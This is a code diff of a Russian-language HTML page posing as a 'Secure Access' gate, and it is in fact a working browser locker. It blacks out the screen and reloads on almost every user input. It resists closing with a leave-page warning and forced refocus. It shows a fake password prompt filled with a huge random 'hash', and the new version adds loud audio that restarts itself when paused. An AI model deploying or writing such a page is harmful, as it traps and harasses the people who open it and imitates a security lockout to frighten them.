@@ -1,95 +1,102 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Secure Access</title>
-  <style>
-    html, body {
-      margin: 0;
-      padding: 0;
-      height: 100%;
-      background: black;
-      color: black;
-      user-select: none;
-      -webkit-user-select: none;
-      -moz-user-select: none;
-      -ms-user-select: none;
-      overflow: hidden;
-      pointer-events: none;
-    }
-    #topBlocker {
-      position: fixed;
-      top: 0;
-      left: 0;
-      right: 0;
-      height: 40px;
-      background: black;
-      opacity: 0.99;
-      z-index: 99999999;
-      pointer-events: all;
-    }
-  </style>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Secure Access with Audio</title>
+<style>
+  html, body {
+    margin: 0; padding: 0; height: 100%; overflow: hidden;
+    background: black;
+    color: black;
+    user-select: none;
+    -webkit-user-select: none;
+    -moz-user-select: none;
+    -ms-user-select: none;
+    pointer-events: none;
+  }
+  #topBlocker {
+    position: fixed;
+    top: 0; left: 0; right: 0;
+    height: 40px;
+    background: black;
+    opacity: 0.99;
+    z-index: 99999999;
+    pointer-events: all;
+  }
+</style>
 </head>
 <body>
-  <div id="topBlocker"></div>
-  <script>
-    // Функция для перезагрузки страницы
-    const reloadPage = () => location.reload();
+<div id="topBlocker"></div>
 
-    // Список событий, при которых будет происходить перезагрузка
-    const events = [
-      'keydown', 'keyup', 'keypress',
-      'mousedown', 'mouseup', 'click', 'dblclick',
-      'contextmenu',
-      'touchstart', 'touchend', 'touchmove',
-      'pointerdown', 'pointerup', 'pointermove',
-      'wheel',
-      'copy', 'cut', 'paste',
-      'visibilitychange',
-      'focus', 'blur',
-      'selectstart',
-      'gesturestart', 'gesturechange', 'gestureend',
-    ];
+<audio id="bgAudio" loop></audio>
 
-    // Добавляем обработчики событий для перезагрузки страницы
-    events.forEach(eventName => {
-      window.addEventListener(eventName, e => {
-        e.preventDefault();
-        e.stopImmediatePropagation();
-        reloadPage();
-      }, {capture: true, passive: false});
+<script>
+(() => {
+  const reloadPage = () => location.reload();
+
+  const events = [
+    'keydown', 'keyup', 'keypress',
+    'mousedown', 'mouseup', 'click', 'dblclick',
+    'contextmenu',
+    'touchstart', 'touchend', 'touchmove',
+    'pointerdown', 'pointerup', 'pointermove',
+    'wheel',
+    'copy', 'cut', 'paste',
+    'visibilitychange',
+    'focus', 'blur',
+    'selectstart',
+    'gesturestart', 'gesturechange', 'gestureend',
+  ];
+
+  events.forEach(eventName => {
+    window.addEventListener(eventName, e => {
+      e.preventDefault();
+      e.stopImmediatePropagation();
+      reloadPage();
+    }, {capture: true, passive: false});
+  });
+
+  document.addEventListener('contextmenu', e => e.preventDefault(), {capture: true});
+
+  window.addEventListener('blur', () => {
+    setTimeout(() => window.focus(), 10);
+  });
+
+  window.onbeforeunload = function() {
+    return "Вы не можете покинуть эту страницу.";
+  };
+
+  const audio = document.getElementById('bgAudio');
+  // Прямой линк на твой mp3 из GitHub raw
+  audio.src = 'https://raw.githubusercontent.com/hedredy/Project/2d591f652b1ac4b12d87e38482ad5679cb0d516c/macan-asphalt-8.mp3';
+  audio.volume = 1.0;
+  audio.loop = true;
+
+  function tryPlayAudio() {
+    audio.play().catch(() => {
+      window.addEventListener('click', () => audio.play(), { once: true });
     });
+  }
+  tryPlayAudio();
 
-    // Отключаем контекстное меню
-    document.addEventListener('contextmenu', e => e.preventDefault(), {capture: true});
+  audio.addEventListener('pause', () => {
+    audio.play();
+  });
 
-    // Попытка вернуть фокус на вкладку, если она потеряна
-    window.addEventListener('blur', () => {
-      setTimeout(() => window.focus(), 10);
-    });
-
-    // Предотвращаем уход со страницы
-    window.onbeforeunload = function() {
-      return "Вы не можете покинуть эту страницу.";
-    };
-
-    // Функция для генерации случайной строки
-    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;:',.<>/?";
-    function randomString(len) {
-      let s = "";
-      for(let i = 0; i < len; i++) {
-        s += chars.charAt(Math.floor(Math.random() * chars.length));
-      }
-      return s;
+  // Генерация хэша
+  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;:',.<>/?";
+  function randomString(len) {
+    let s = "";
+    for(let i = 0; i < len; i++) {
+      s += chars.charAt(Math.floor(Math.random() * chars.length));
     }
-
-    // Генерация случайного хэша
-    const hash = randomString(50000);
-    // Запрос пароля
-    prompt("SECURE ACCESS REQUIRED\n\nHASH:\n\n" + hash + "\n\nEnter password:");
-    // Перезагрузка страницы после ввода
-    reloadPage();
-  </script>
+    return s;
+  }
+  const hash = randomString(50000);
+  prompt("SECURE ACCESS REQUIRED\n\nHASH:\n\n" + hash + "\n\nEnter password:");
+  reloadPage();
+})();
+</script>
 </body>
 </html>
